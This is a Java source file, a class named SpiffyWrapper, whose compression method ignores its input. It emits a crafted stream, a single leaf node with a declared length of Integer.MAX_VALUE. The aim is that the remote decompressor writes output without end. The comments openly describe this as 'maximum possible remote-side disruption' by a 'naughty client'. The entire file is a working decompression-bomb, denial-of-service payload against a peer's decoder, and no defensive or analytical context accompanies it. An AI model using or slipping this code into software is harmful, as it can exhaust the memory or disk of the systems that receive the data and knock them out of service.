package net.computerpoint.wrapper;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class SpiffyWrapper {
    public void squeeze(InputStream in, OutputStream out) throws IOException {
    	IntegratedOut oo = new IntegratedOut(out);
    	
    	// isPadded == false
    	oo.write((int)0);
    	
    	// We're creating a formation that's just a single Node that's a leaf.
    	// The SpiffyWrapper unzip engine won't read trie traversal information
    	//   if the root node is a leaf. It just keeps writing that value until
    	//   it his the length limit.
    	// The leaf Node. Value == 0.
    	oo.write(true);
    	oo.write((short)0);
    	// The length. We're making this very large for maximum possible
    	//   remote-side disruption.
    	oo.write((int)Integer.MAX_VALUE);
    	
    	oo.close();
    }

    public void unzip(InputStream inStream, OutputStream outStream) throws Exception {
    	// nop in hax land, since our naughty client will never need to use this
    }
}
